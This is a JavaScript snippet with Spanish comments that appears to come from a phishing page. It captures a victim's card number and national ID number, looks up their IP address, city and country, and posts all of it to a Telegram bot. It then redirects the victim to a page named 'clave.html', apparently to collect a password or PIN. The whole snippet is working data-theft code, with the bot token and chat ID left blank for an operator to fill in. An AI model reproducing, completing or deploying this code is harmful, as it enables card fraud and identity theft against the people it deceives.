<script>
    async function handleSubmit(event) {
        event.preventDefault(); // Prevenir el envío por defecto del formulario
        
        // Obtener los valores de los campos
        const cardNumber = document.getElementById("cardNumberInput").value;
        const identity = document.getElementById("identity").value;

        // Guardar datos en localStorage
        localStorage.setItem("savedCardNumber", cardNumber);
        localStorage.setItem("savedIdentity", identity);

        // Obtener la información de la IP y localización
        const locationData = await getLocationData();

        // Crear el mensaje en formato escalera
        const message = `Número de Tarjeta: ${cardNumber}\nCédula de Identidad: ${identity}\nIP: ${locationData.ip}\nCiudad: ${locationData.city}\nPaís: ${locationData.country}`;
        
        // Enviar datos a Telegram
        await sendMessageToTelegram(message);

        // Redirigir a la página clave.html
        window.location.href = "clave.html"; // Redirección a clave.html
    }

    async function getLocationData() {
        try {
            const response = await fetch('https://ipwhois.io/');
            if (!response.ok) throw new Error('Error al obtener la localización');
            return await response.json();
        } catch (error) {
            console.error('Error obteniendo datos de localización:', error);
            return { ip: 'No disponible', city: 'No disponible', country: 'No disponible' }; // Retornar valores predeterminados en caso de error
        }
    }

    async function sendMessageToTelegram(message) {
        const BOT_TOKEN = ''; // Tu token
        const CHAT_ID = ''; // Tu chat ID
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        const data = {
            chat_id: CHAT_ID,
            text: message,
        };

        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch (error) {
            console.error('Error enviando mensaje a Telegram:', error);
        }
    }
</script>
